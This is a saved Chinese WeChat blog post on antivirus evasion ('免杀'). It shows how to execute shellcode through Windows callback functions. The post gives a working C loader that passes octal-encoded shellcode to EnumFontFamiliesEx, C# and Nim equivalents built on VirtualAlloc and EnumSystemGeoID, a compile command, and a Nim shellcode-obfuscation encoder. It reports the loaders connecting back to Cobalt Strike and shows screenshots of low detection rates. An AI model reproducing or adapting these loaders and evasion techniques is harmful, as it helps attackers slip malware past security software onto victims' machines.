> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/G5SPb73sl6e8cVjIN7atvg)

  正值某大型活动期间，于是水一篇文章，来聊聊最近大家比较喜欢的利用回调函数来进行免杀这个小 tips。

    如果你之前接触过编程语言，就一定会对回调函数 (callback) 有所了解，因为前人已对这些东西有过详细的介绍，所以这里不再过多赘述，不明白的可以参考 MicroPest 师傅的这两篇文章，里面详细的介绍了回调函数以及回调函数来进行 shellcode 执行的方法：https://my.oschina.net/u/4079523/blog/5011400、https://my.oschina.net/u/4079523/blog/5011399 而回调函数也即下图所示：

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08VticEQ2E5bFM8luxlibTahDp2OLXNRGic3CdCIMLkcYXHpboEliaUjEiaJQicNlebTHcBZgjgibDThFIZLg/640?wx_fmt=png)

那么一个比较直接的例子就是：

```
#include <Windows.h>
/*
 * https://osandamalith.com - @OsandaMalith
 */
  int main() {
  int shellcode[] = {
    015024551061,014333060543,012124454524,06034505544,
    021303073213,021353206166,03037505460,021317057613,
    021336017534,0110017564,03725105776,05455607444,
    025520441027,012701636201,016521267151,03735105760,
    0377400434,032777727074
  };
  DWORD oldProtect = 0;
  BOOL ret = VirtualProtect((LPVOID)shellcode, sizeof shellcode, PAGE_EXECUTE_READWRITE, &oldProtect);

  EnumFontFamiliesEx(GetDC(0), 0, (FONTENUMPROC)(char*)shellcode, 0, 0);
}
```

而这样做的好处就是我们避免了一下敏感函数的使用，比如内存分配的：malloc(),virtualalloc(),heapalloc() 的调用，更好的防止被安全软件所查杀。

    但是 C/C++ 的此类用法已经被大家所熟知了，效果自然也就慢慢的不好了，所以下面我们将它改造成 Csharp 版本和 Nim 版本，来提高我们的免杀效果。首先是 Csharp 版本。这里选择的 api 为 EnumSystemGeoID，其函数原型如下：

```
BOOL EnumSystemGeoID(
  GEOCLASS     GeoClass,
  GEOID        ParentGeoId,
  GEO_ENUMPROC lpGeoEnumProc
);
```

注：使用该 api 无法避免 virtualalloc 的使用，其 api 调用链如下：

```
virtualalloc ---> memcpy --->  EnumSystemGeoID
```

按照之前的文章所说，我们还是需要先进行 api 的调用：

```
[DllImport("kernel32")]
        public static extern IntPtr VirtualAlloc(IntPtr lpStartAddr, uint size, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", EntryPoint = "EnumSystemGeoID")]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool EnumSystemGeoID(uint GeoClass, int ParentGeoId, IntPtr lpGeoEnumProc);
```

下面就是函数的使用了，即分配内存、复制 shellcode、回调。

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08VticEQ2E5bFM8luxlibTahDpw4nH6HBFvmgOsoHgFhIVCEOicXVrtXOsULrkxk26zUO3ng5588uQSYQ/640?wx_fmt=png)

执行后 cs 上线。因为原生 shellcode 的问题，效果肯定不好，这里可以根据自己的需要进行 shellcode 的混淆等，混淆后编译，最终的查杀效果如下：

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08VticEQ2E5bFM8luxlibTahDpoGZqmthiaibZ2MXjoicqXShhb1ibr8awxvwbMuEdlw6O0VFxicx9Ju13yAw/640?wx_fmt=png)

然后就是最近比较火的 nim 了，nim 的 windows 调用依赖于第三方库，我们可以这样调用它。

```
import winim/lean
```

然后就是一样的 api 的调用了，这里就仅仅展示一下 VirtualAlloc 吧：

```
let rPtr = VirtualAlloc(
            nil,
            cast[SIZE_T](shellcode.len),
            MEM_COMMIT,
            PAGE_EXECUTE_READ_WRITE
        )
```

编译

```
nim cc -d=release --opt=size .\callback.nim
```

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08VticEQ2E5bFM8luxlibTahDpC0vosH9fdxWhic8bgaDIicC0pugicNLEGbtibqdcl7MeicmQPpwLFwYn93g/640?wx_fmt=png)

执行，成功上线。通用查看查杀率：

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08VticEQ2E5bFM8luxlibTahDp9MmOQsjH82InMsfIibkIh8161bcuVx5XwmCUOHfE3GZcxm9F3jD5VoQ/640?wx_fmt=png)

shellcode 的加密可以参考：

```
var dict = toSeq(0..255).mapIt(it.uint8)
randomize()
dict.shuffle()

let entireFile = readFile(paramStr(1)).mapIt(it.uint8)
var finallTable = newSeq[uint8](entireFile.len)
for i in 0..high(entireFile):
    for k in 0..high(dict):
        if entireFile[i] == dict[k]:
            finallTable[i] = k.uint8
let result = encode(concat(dict,finallTable))
echo result
```

     ▼

更多精彩推荐，请关注我们

▼

![](https://mmbiz.qpic.cn/mmbiz_png/mj7qfictF08XZjHeWkA6jN4ScHYyWRlpHPPgib1gYwMYGnDWRCQLbibiabBTc7Nch96m7jwN4PO4178phshVicWjiaeA/640?wx_fmt=png)